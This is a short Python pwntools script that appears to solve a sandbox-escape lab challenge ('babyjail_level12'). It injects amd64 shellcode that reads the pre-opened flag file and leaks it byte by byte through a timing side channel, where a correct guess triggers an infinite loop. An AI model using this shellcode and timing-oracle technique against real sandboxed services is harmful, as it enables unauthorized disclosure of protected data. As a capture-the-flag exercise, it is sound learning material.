'''
openat
'''

from pwn import *
from datetime import datetime
context.arch = "amd64"
flag=[]
for i in range(0, 57):
    for j in range (33, 127):
        print("%d : %d"%(i,j))
        exit_asm = "pop rdi\n" * (int(i / 8)+1) + "shr rdi, %d\n"%((i%8) * 8) + '''
        and rdi, 0x00000000000000ff\n
        cmp rdi, %d
        lab1:
        jz lab1
        '''%j
        my_sc = asm('''
            sub rsp, 0x100
            mov rdi, 0x3
            mov rax, SYS_read
            mov rsi, rsp
            push  0x100
            pop rdx
            syscall

        '''+exit_asm)
        # display the bytes
        #print(disasm(my_sc))
        # fd = open("ttt-raw","wb+")
        # fd.write(my_sc)
        # fd.close()
        # def preexec_openfd():
        #     fd = os.open("/", flags=0x20000)
        #     os.dup2(3, fd)

        p = process(["/challenge/babyjail_level12", "/flag"])
        #context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
        #p = gdb.debug(["/challenge/babyjail_level12", "/flag"], gdbscript="source /opt/gef/gef.py")
        
        p.send(my_sc)
        start_time = datetime.now()
        #start_time = time.monotonic()
        a = p.wait(timeout=3)
        p.close()
        end_time = datetime.now()
        elapsed_time = end_time - start_time
        if elapsed_time.seconds >= 3:
            flag.append(j)
            break
for i in flag:
    print("%c"%i, end="")
